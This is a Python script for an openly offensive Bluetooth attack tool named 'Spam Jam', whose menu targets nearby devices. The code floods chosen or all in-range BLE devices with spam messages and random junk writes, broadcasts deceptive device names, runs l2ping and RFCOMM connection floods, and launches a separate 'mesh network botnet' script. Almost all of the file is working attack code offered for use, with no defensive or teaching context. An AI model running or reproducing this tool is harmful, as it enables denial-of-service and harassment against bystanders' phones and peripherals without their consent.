#!/usr/bin/env python3
import os
import sys
import time
import random
import subprocess
from bluepy.btle import Scanner, Peripheral, DefaultDelegate, ADDR_TYPE_RANDOM, ADDR_TYPE_PUBLIC, BTLEException

# 🎨 Spam Jam Banner
def print_banner():
    print(r"""
███████╗██████╗  █████╗ ███╗   ███╗         ██╗ █████╗ ███╗   ███╗
██╔════╝██╔══██╗██╔══██╗████╗ ████║         ██║██╔══██╗████╗ ████║
███████╗██████╔╝███████║██╔████╔██║         ██║███████║██╔████╔██║
╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║    ██   ██║██╔══██║██║╚██╔╝██║
███████║██║     ██║  ██║██║ ╚═╝ ██║    ╚█████╔╝██║  ██║██║ ╚═╝ ██║
╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝     ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝ 
💜 Spam Jam – Now with BLE Mesh Network Botnet by ekoms savior 💜
""")

# 🎯 BLE Spam Class
class BLESpam(DefaultDelegate):
    def __init__(self):
        DefaultDelegate.__init__(self)
    def handleNotification(self, cHandle, data):
        print(f"🔔 Notification from BLE device: {data}")

# 💌 BLE Advertise All
def flipper_ble_advertise_all():
    print("💜 Launching BLE Advertise All  💣📡")
    names = [
        "SpamJam_XOXO", "💜HAXX💜", "BLE_Boop", "👾x0x0x", 
        "Free_Wifi_LOL", "Not_A_Trap", "💣 BT_Bomb", "UFO-SIGNAL", 
        "🍭CandyBLE", "💀NSA_Van", "HackThePlanet", "💜ekomsSavior💜"
    ]
    try:
        subprocess.run(["bluetoothctl", "power", "on"], stdout=subprocess.DEVNULL)
        subprocess.run(["bluetoothctl", "discoverable", "on"], stdout=subprocess.DEVNULL)
        subprocess.run(["bluetoothctl", "pairable", "on"], stdout=subprocess.DEVNULL)
        subprocess.run(["bluetoothctl", "agent", "NoInputNoOutput"], stdout=subprocess.DEVNULL)

        while True:
            for name in names:
                subprocess.run(["bluetoothctl", "system-alias", name], stdout=subprocess.DEVNULL)
                print(f"📡 Broadcasting: {name}")
                time.sleep(1.2)

    except KeyboardInterrupt:
        print("\n🛑 BLE Advertise All stopped. Restoring name...")
        subprocess.run(["bluetoothctl", "system-alias", "SpamJam"], stdout=subprocess.DEVNULL)

# 🔎 BLE Scanner
def interactive_ble_scan():
    print("🔎 Scanning for BLE devices nearby...")
    scanner = Scanner()
    try:
        devices = list(scanner.scan(10.0))
        if not devices:
            print("⚠️ No BLE devices found.")
            return []
        for idx, dev in enumerate(devices):
            print(f"🔹 {idx}: {dev.addr} ({dev.addrType}), RSSI={dev.rssi} dB")
        return devices
    except BTLEException as e:
        print(f"⚠️ Scan failed: {e}")
        return []

# 💌 Spam Single BLE Device
def spam_ble():
    devices = interactive_ble_scan()
    if not devices:
        return
    try:
        idx = int(input("💜 Index to spam: "))
        target_mac = devices[idx].addr
    except (ValueError, IndexError):
        print("⚠️ Invalid index.")
        return
    custom_message = input("💜 Your spam message: ").encode()
    try:
        peripheral = Peripheral(target_mac, ADDR_TYPE_RANDOM)
    except BTLEException:
        try:
            peripheral = Peripheral(target_mac, ADDR_TYPE_PUBLIC)
        except BTLEException as e:
            print(f"❌ Failed: {e}")
            return
    peripheral.setDelegate(BLESpam())
    while True:
        try:
            peripheral.writeCharacteristic(0x0001, custom_message)
            print(f"💜 Spammed: {custom_message.decode(errors='ignore')}")
            time.sleep(0.5)
        except Exception as e:
            print(f"⚠️ Error: {e}")
            break

# 💌 Spam All BLE Devices
def spam_all_ble():
    devices = interactive_ble_scan()
    if not devices:
        return
    custom_message = input("💜 Message for all: ").encode()
    for device in devices:
        try:
            print(f"🚀 Spamming {device.addr}")
            peripheral = Peripheral(device.addr, ADDR_TYPE_RANDOM)
            peripheral.setDelegate(BLESpam())
            peripheral.writeCharacteristic(0x0001, custom_message)
            print(f"💜 Sent to {device.addr}")
            peripheral.disconnect()
        except Exception as e:
            print(f"⚠️ {device.addr} skipped: {e}")

# 🚫 Jam Single
def jam_ble():
    subprocess.run(["hciconfig", "hci0", "reset"], stdout=subprocess.DEVNULL)
    scanner = Scanner()
    try:
        devices = list(scanner.scan(15.0))
    except BTLEException as e:
        print(f"⚠️ BLE Scan Failed: {e}")
        return
    for idx, device in enumerate(devices):
        print(f"🔹 {idx}: {device.addr} RSSI={device.rssi} dB")
    try:
        idx = int(input("💜 Index to jam: "))
        target = devices[idx].addr
    except:
        print("⚠️ Invalid choice.")
        return
    try:
        peripheral = Peripheral(target)
        while True:
            junk = os.urandom(random.randint(20, 50))
            peripheral.writeCharacteristic(0x000b, junk, withResponse=False)
            print(f"🚫 Jammed {target}")
            time.sleep(0.1)
    except Exception as e:
        print(f"⚠️ {e}")

# 🚫 Jam All
def jam_all_ble():
    try:
        min_rssi = int(input("💜 RSSI threshold (e.g. -80): "))
    except:
        min_rssi = -80
    try:
        while True:
            scanner = Scanner()
            devices = list(scanner.scan(15.0))
            for device in devices:
                if device.rssi >= min_rssi:
                    try:
                        print(f"💥 Jamming {device.addr}")
                        peripheral = Peripheral(device.addr)
                        junk = os.urandom(random.randint(20, 50))
                        peripheral.writeCharacteristic(0x000b, junk, withResponse=False)
                        peripheral.disconnect()
                        time.sleep(0.2)
                    except Exception:
                        pass
            time.sleep(5)
    except KeyboardInterrupt:
        print("🛑 Jam stopped.")

# 🧠 Start Bluetooth
def start_bluetooth():
    print("📡 Starting Bluetooth...")
    subprocess.run(['sudo', 'service', 'bluetooth', 'start'], check=True)
# 💥 L2Ping
def l2ping_attack():
    devices = interactive_ble_scan()
    if not devices:
        return
    try:
        idx = int(input("💜 Enter index of device to L2Ping: "))
        addr = devices[idx].addr
    except (ValueError, IndexError):
        print("⚠️ Invalid selection.")
        return
    if os.geteuid() != 0:
        print("⚠️ L2Ping needs sudo!")
        return
    print(f"💥 Sending L2Ping to {addr}")
    try:
        subprocess.run(['l2ping', '-c', '100', '-s', '600', addr], check=True)
        print("✅ L2Ping success!")
    except subprocess.CalledProcessError:
        print(f"⚠️ Failed. Device may be offline.")

# ✅ RFCOMM Flood
def rfcomm_flood():
    devices = interactive_ble_scan()
    if not devices:
        return
    try:
        idx = int(input("💜 Enter index of device for RFCOMM Flood: "))
        addr = devices[idx].addr
    except (ValueError, IndexError):
        print("⚠️ Invalid selection.")
        return
    print(f"💥 Starting RFCOMM flood on {addr}...")
    for i in range(1000):
        try:
            subprocess.run(['rfcomm', 'connect', addr, '1'], check=True)
            print(f"✅ Attempt {i+1}: Connected")
        except subprocess.CalledProcessError:
            print(f"⚠️ Attempt {i+1}: Failed")


# 🌐 Mesh Botnet Menu Launcher
def launch_mesh_botnet_menu():
    print("🌐 Launching Mesh Menu...\n")
    try:
        subprocess.run(["sudo", "python3", "spamjam_mesh.py"])
    except Exception as e:
        print(f"⚠️ Failed to launch mesh menu: {e}")

def main():
    print_banner()
    while True:
        print("\n🔹 0 BLE Advertise All 💣")
        print("🔹 1 Start Bluetooth Service 📡")
        print("🔹 2 Scan for Bluetooth devices 📡")
        print("🔹 3 Spam a BLE device 💌")
        print("🔹 4 Spam All BLE Devices 💌💥")
        print("🔹 5 Jam a BLE device 🚫")
        print("🔹 6 Jam All BLE Devices 🚫💥")
        print("🔹 7 Mesh Network Menu 🌐")
        print("🔹 8 L2Ping Attack 💥")
        print("🔹 9 RFCOMM Flood 💥")
        print("🔹 10 Quit 🚪")

        choice = input("💜 Choose an option (0-10): ").strip()
        functions = [
            flipper_ble_advertise_all, start_bluetooth, scan_bluetooth, spam_ble,
            spam_all_ble, jam_ble, jam_all_ble, launch_mesh_botnet_menu,
            l2ping_attack, rfcomm_flood
        ]

        if choice == "10":
            print("👋 Goodbye, fren! XOXOXO 💜")
            sys.exit()
        elif choice in map(str, range(0, 10)):
            functions[int(choice)]()
        else:
            print("⚠️ Invalid choice. Try again! 💜")

def scan_bluetooth():
    print("🔎 Scanning for Bluetooth...")
    subprocess.run(["hciconfig", "hci0", "reset"], stdout=subprocess.DEVNULL)
    scanner = Scanner()
    try:
        devices = list(scanner.scan(10.0))
        for idx, d in enumerate(devices):
            print(f"🔹 {idx}: {d.addr} RSSI={d.rssi} dB")
    except BTLEException as e:
        print(f"⚠️ Scan failed: {e}")

if __name__ == "__main__":
    main()
